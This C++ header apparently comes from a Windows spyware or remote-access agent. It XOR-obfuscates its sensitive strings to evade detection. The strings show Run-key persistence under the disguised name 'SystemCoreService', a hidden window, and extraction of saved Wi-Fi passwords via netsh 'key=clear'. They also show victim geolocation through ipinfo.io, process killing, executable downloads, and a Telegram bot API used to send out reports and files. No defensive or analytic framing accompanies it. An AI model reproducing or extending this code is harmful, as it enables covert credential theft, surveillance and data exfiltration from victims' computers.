#pragma once

#include <string>
#include <unordered_map>
#include <mutex>

namespace nuub::domain {

// Runtime string encryption/decryption
class StringTable {
    static constexpr uint8_t XOR_KEY = 0x73;
    inline static std::mutex mutex_;
    inline static std::unordered_map<std::string, std::string> cache_;

    static std::string xor_decode(const std::string& encoded) {
        std::string result = encoded;
        for (size_t i = 0; i < result.size(); ++i) {
            result[i] ^= static_cast<char>(XOR_KEY + (i & 0xFF));
        }
        return result;
    }

    static std::string xor_encode(const std::string& plain) {
        return xor_decode(plain); // XOR is symmetric
    }

public:
    // Store and retrieve encrypted strings
    static void store(const std::string& key, const std::string& value) {
        std::lock_guard lock(mutex_);
        cache_[key] = xor_encode(value);
    }

    static std::string get(const std::string& key) {
        std::lock_guard lock(mutex_);
        auto it = cache_.find(key);
        if (it != cache_.end()) {
            return xor_decode(it->second);
        }
        return "";
    }

    // Initialize with all sensitive strings
    static void init() {
        // Registry paths
        store("reg_run", "Software\\Microsoft\\Windows\\CurrentVersion\\Run");

        // Network
        store("tg_api", "https://api.telegram.org/bot");
        store("tg_send_doc", "/sendDocument");
        store("tg_send_msg", "/sendMessage");
        store("tg_updates", "getUpdates");
        store("ipinfo", "https://ipinfo.io/json");
        store("maps_link", "https://www.google.com/maps/search/?api=1&query=");

        // System commands
        store("cmd_exe", "cmd.exe");
        store("tasklist", "tasklist /FO CSV 2>&1");
        store("taskkill", "taskkill /PID ");
        store("netsh_profiles", "netsh wlan show profiles 2>&1");
        store("netsh_key", "netsh wlan show profile name=\"");
        store("key_clear", "\" key=clear 2>&1");
        store("key_content", "Key Content");
        store("key_content_es", "Contenido de la clave");

        // Persistence
        store("ntdll", "ntdll.dll");
        store("rtl_get_version", "RtlGetVersion");
        store("agent_window", "AgentWindowClass");
        store("hidden_window", "Hidden");

        // Messages
        store("connected_msg", "Agente conectado y activo.");
        store("heartbeat_msg", "Heartbeat - still alive");
        store("no_activity", "No habia nueva actividad para reportar.");

        // File operations
        store("downloaded", "downloaded_file.exe");
        store("report_prefix", "reporte_");
        store("activity_log", "activity_log.csv");

        // Config keys
        store("cfg_token", "telegram_bot_token");
        store("cfg_admin", "admin_chat_id");
        store("cfg_admins", "admin_chat_ids");
        store("cfg_pc", "pc_identifier");
        store("cfg_password", "encryption_password");
        store("cfg_master_log", "master_log_filename");
        store("cfg_activity_log", "activity_log_filename");
        store("cfg_auto_start", "auto_start_entry_name");
        store("cfg_log", "log_filename");
        store("cfg_heartbeat", "heartbeat_interval_minutes");

        // Default names
        store("default_pc", "PC-Principal");
        store("default_entry", "SystemCoreService");
        store("default_master", "log_master.txt");
        store("default_log", "nuub.log");
    }
};

} // namespace nuub::domain
